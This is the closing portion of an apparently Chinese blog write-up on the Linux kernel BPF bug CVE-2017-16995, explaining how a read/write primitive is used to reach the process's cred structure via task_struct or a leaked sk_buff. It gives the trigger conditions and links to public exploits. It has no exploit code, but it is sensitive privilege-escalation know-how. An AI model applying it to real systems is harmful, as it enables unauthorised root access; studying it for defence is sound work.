<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">struct</span> thread_info &#123;</div><div class="line">    <span class="keyword">struct</span> pcb_struct	pcb;</div><div class="line">    <span class="keyword">struct</span> task_struct	*task;</div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>	flags;</div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>	ieee_state;</div><div class="line">    <span class="keyword">struct</span> exec_domain	*exec_domain;</div><div class="line">    <span class="keyword">mm_segment_t</span>	addr_limit;</div><div class="line">    <span class="keyword">unsigned</span>		cpu;</div><div class="line">    [….]</div><div class="line">    <span class="keyword">struct</span> restart_block	restart_block;</div><div class="line">&#125;;</div><div class="line">/-------------------------------------------------------------/</div><div class="line"><span class="keyword">struct</span> task_struct &#123;</div><div class="line">    <span class="keyword">volatile</span> <span class="keyword">long</span> 	state;</div><div class="line">    <span class="keyword">void</span> 		*<span class="built_in">stack</span>;</div><div class="line">    <span class="keyword">atomic_t</span> 		usage;</div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> 	flags;</div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> 	ptrace;</div><div class="line">    [...]</div><div class="line">    <span class="keyword">struct</span> list_head 	cpu_timers[<span class="number">3</span>];</div><div class="line">    <span class="keyword">const</span> <span class="keyword">struct</span> cred 	*real_cred;</div><div class="line">    <span class="keyword">const</span> <span class="keyword">struct</span> cred 	*cred;</div><div class="line">    <span class="keyword">char</span> 	comm[TASK_COMM_LEN];</div><div class="line">    […]</div><div class="line">&#125;</div><div class="line">/-------------------------------------------------------------/</div><div class="line"><span class="keyword">struct</span> cred &#123;</div><div class="line">    <span class="keyword">atomic_t</span>	usage;</div><div class="line">    <span class="keyword">kuid_t</span>		uid;	</div><div class="line">    <span class="keyword">kgid_t</span>		gid;	</div><div class="line">    <span class="keyword">kuid_t</span>		suid;	</div><div class="line">    <span class="keyword">kgid_t</span>		sgid;	</div><div class="line">    <span class="keyword">kuid_t</span>		euid;	</div><div class="line">    <span class="keyword">kgid_t</span>		egid;</div><div class="line">    [...]</div><div class="line">    <span class="keyword">struct</span> rcu_head	rcu;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<h4 id="泄漏skbuff"><a href="#泄漏skbuff" class="headerlink" title="泄漏skbuff"></a>泄漏skbuff</h4><p>第二种是通过获取当前套接字的sk_buff遍历当前进程的cred结构体，sk_buff变量中有一个sk元素(struct sock *sk)，而sk元素又包含当前进程的cred结构体，所有通过sk_buff变量也能获取到当前进程的cred结构体实现内核提权。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line">sk_buff的获取可以通过对fp做加减获得</div><div class="line">sk_buff-&gt;sk-&gt;sk_peer_cred    &lt;&lt; cred结构体</div><div class="line">/-------------------------------------------------------------/</div><div class="line"><span class="keyword">struct</span> sk_buff &#123;</div><div class="line">    <span class="keyword">struct</span> sk_buff	  *next;</div><div class="line">    <span class="keyword">struct</span> sk_buff	  *prev;</div><div class="line">    <span class="keyword">union</span> &#123;</div><div class="line">        <span class="keyword">ktime_t</span>                    tstamp;</div><div class="line">        <span class="keyword">struct</span> skb_mstamp  skb_mstamp;</div><div class="line">    &#125;;</div><div class="line">    <span class="keyword">struct</span> sock                  *sk;</div><div class="line">    <span class="keyword">struct</span> net_device	 *dev;</div><div class="line">    [...]</div><div class="line">&#125;</div><div class="line">/-------------------------------------------------------------/</div><div class="line"><span class="keyword">struct</span> sock &#123;</div><div class="line">    [...]</div><div class="line">    <span class="keyword">struct</span> pid	*sk_peer_pid;</div><div class="line">    <span class="keyword">const</span> <span class="keyword">struct</span> cred	*sk_peer_cred;</div><div class="line">    <span class="keyword">long</span>	sk_rcvtimeo;</div><div class="line">    <span class="keyword">long</span>	sk_sndtimeo;</div><div class="line">    [...]</div><div class="line">&#125;;</div><div class="line">/-------------------------------------------------------------/</div><div class="line"><span class="keyword">struct</span> cred &#123;</div><div class="line">    <span class="keyword">atomic_t</span>	usage;</div><div class="line">    <span class="keyword">kuid_t</span>		uid;	</div><div class="line">    <span class="keyword">kgid_t</span>		gid;	</div><div class="line">    <span class="keyword">kuid_t</span>		suid;	</div><div class="line">    <span class="keyword">kgid_t</span>		sgid;	</div><div class="line">    <span class="keyword">kuid_t</span>		euid;	</div><div class="line">    <span class="keyword">kgid_t</span>		egid;</div><div class="line">    [...]</div><div class="line">    <span class="keyword">struct</span> rcu_head	rcu;</div><div class="line">&#125;;</div></pre></td></tr></table></figure></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol>
<li>感觉这个漏洞还挺有趣，第一次接触这类漏洞，通过传入精心构造的数据控制程序的执行流程，让内核直接执行我们传入的代码，利用起来也特别稳定还非常好理解而且由于都是正常操作，所以直接绕过了内核对于漏洞利用的缓解机制，完全不像哪些容易造成系统崩溃的破坏内存的漏洞。</li>
<li>跟着exp分析了下该漏洞，并做一下记录，不断努力，多找一些exploit，跟着作者的思路一步一步的分析，思考作者当时的想法，不断积累漏洞利用经验。</li>
</ol>
<p>触发该漏洞需要两个条件：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Kernel编译选项CONFIG_BPF_SYSCALL打开，启用了bpf syscall；</div><div class="line">/proc/sys/unprivileged_bpf_disabled设置为<span class="number">0</span>，允许非特权用户调用bpf_syscall；</div></pre></td></tr></table></figure></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">https:<span class="comment">//www.csdn.net/gather_2d/MtjaQg2sMzIwMy1ibG9n.html</span></div><div class="line">https:<span class="comment">//blog.csdn.net/ljy1988123/article/details/50444693</span></div><div class="line">最初的<span class="built_in">exp</span></div><div class="line">https:<span class="comment">//github.com/brl/grlh/blob/master/get-rekt-linux-hardened.c</span></div><div class="line">https:<span class="comment">//github.com/dangokyo/CVE_2017_16995</span></div><div class="line">https:<span class="comment">//github.com/rlarabee/exploits/tree/master/cve-2017-16995</span></div></pre></td></tr></table></figure>
</article><!-- lincense--><div class="license-wrapper"><p> <span>Author:  </span><a href="http://github.com">Let_go</a></p><p> <span>Link:  </span><a href="http://github.com/2018/07/16/CVE-2017-16995/">http://github.com/2018/07/16/CVE-2017-16995/</a></p><p> <span>Copyright:  </span><span>All articles in this blog are licensed under <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/3.0">CC BY-NC-SA 3.0</a> unless stating additionally.</span></p></div><div class="post-paginator"><a class="prevSlogan" href="/2018/08/26/CVE-2018-8120/" title="CVE-2018-8120"><span>< PreviousPost</span><br><span class="prevTitle">CVE-2018-8120</span></a><a class="nextSlogan" href="/2018/04/30/linux内核调试环境搭建/" title="linux内核调试环境搭建"><span>NextPost ></span><br><span class="nextTitle">linux内核调试环境搭建</span></a><div class="clear"></div></div><div id="comment"></div></section></article><footer id="cxo-footer-outer"><div id="cxo-footer-inner"><p class="footer-container"><span>Site by </span><a href="http://hexo.io"><span>Hexo</span></a><span> | theme </span><a href="https://github.com/Longlongyu/hexo-theme-Cxo"><span>Cxo</span></a></p><i class="fa fa-user"> </i><span id="busuanzi_value_site_uv"></span><span> | </span><i class="fa fa-eye"> </i><span id="busuanzi_value_site_pv"></span></div></footer><!-- catelog--><div class="toc-wrapper" style="top: 70vh;"><div class="toc-catalog"><i class="fa fa-list"> </i><span>CATALOG</span></div><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞信息"><span class="toc-number">1.1.</span> <span class="toc-text">漏洞信息</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞原理"><span class="toc-number">2.</span> <span class="toc-text">漏洞原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#基础知识"><span class="toc-number">2.1.</span> <span class="toc-text">基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#BPF简介"><span class="toc-number">2.1.1.</span> <span class="toc-text">BPF简介</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#BPF系统调用"><span class="toc-number">2.1.2.</span> <span class="toc-text">BPF系统调用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞功能"><span class="toc-number">2.2.</span> <span class="toc-text">漏洞功能</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞原理-1"><span class="toc-number">2.3.</span> <span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#补丁用意"><span class="toc-number">2.4.</span> <span class="toc-text">补丁用意</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞利用"><span class="toc-number">3.</span> <span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#基础知识-1"><span class="toc-number">3.1.</span> <span class="toc-text">基础知识</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用思路"><span class="toc-number">3.2.</span> <span class="toc-text">利用思路</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#构造读写原语"><span class="toc-number">3.2.1.</span> <span class="toc-text">构造读写原语</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#泄漏fp"><span class="toc-number">3.2.2.</span> <span class="toc-text">泄漏fp</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#泄漏skbuff"><span class="toc-number">3.2.3.</span> <span class="toc-text">泄漏skbuff</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结"><span class="toc-number">4.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考"><span class="toc-number">5.</span> <span class="toc-text">参考</span></a></li></ol></div><!-- top--><i class="fa fa-arrow-up close" id="go-up" aria-hidden="true"></i></body></html>